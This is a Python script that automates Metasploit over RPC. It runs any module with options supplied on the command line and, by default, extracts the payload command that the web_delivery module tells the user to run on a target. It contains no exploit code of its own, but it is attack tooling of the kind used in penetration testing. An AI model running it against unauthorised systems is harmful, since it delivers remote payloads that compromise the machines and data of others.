import argparse
import re
import time
import logging
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError

def run_exploit(module_name, options, msf_password, rpc_server, rpc_port, regex=None):
    try:
        # Connect to the Metasploit RPC server
        client = MsfRpcClient(msf_password, server=rpc_server, port=rpc_port, ssl=False)
        logging.info(f"Connected to Metasploit RPC server at {rpc_server}:{rpc_port}")

        # Create a new console
        console = client.consoles.console()
        logging.info(f"Created a new console with ID: {console.cid}")

        # Use the specified module
        logging.info(f"Using module: {module_name}")
        console.write(f'use {module_name}\n')

        # Set the provided options dynamically
        for option, value in options.items():
            logging.info(f"Setting option: {option} = {value}")
            console.write(f'set {option} {value}\n')

        # Run the exploit in the console
        logging.info("Running the exploit...")
        console.write('run\n')

        # Wait for the output to generate
        time.sleep(3)

        # Read the console output
        output = console.read()['data']

        # Filter output if regex is provided
        if regex:
            logging.info(f"Filtering output with regex: {regex}")
            matches = re.findall(regex, output, re.DOTALL)
            output = "\n".join(matches)

        # Print the filtered output
        logging.info("Exploit run completed. Output:")
        print(output)

        return output

    except MsfRpcError as e:
        logging.error(f"Metasploit RPC error: {e}")
        print(f"Error: Could not connect to Metasploit RPC server at {rpc_server}:{rpc_port}.")
        return None

    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        print(f"Error: {str(e)}")
        return None

if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Argument parsing
    parser = argparse.ArgumentParser(description='Run any Metasploit exploit with dynamic options.')
    parser.add_argument('module', help='The Metasploit module to use (e.g., exploit/multi/script/web_delivery).')
    parser.add_argument('--option', action='append', help='Module options in the form OPTION=VALUE.', required=True)
    parser.add_argument('--msf-password', help='The password for the Metasploit RPC server.', default='msfrpc')
    parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default='127.0.0.1')
    parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=55552)
    parser.add_argument('--regex', help='Regex pattern to filter output.', default=r"Run the following command on the target machine:\n(.*)")

    args = parser.parse_args()

    # Parse the options
    options = {}
    for opt in args.option:
        key, value = opt.split('=')
        options[key] = value

    # Run the exploit with the provided module and options
    run_exploit(args.module, options, args.msf_password, args.rpc_server, args.rpc_port, args.regex)
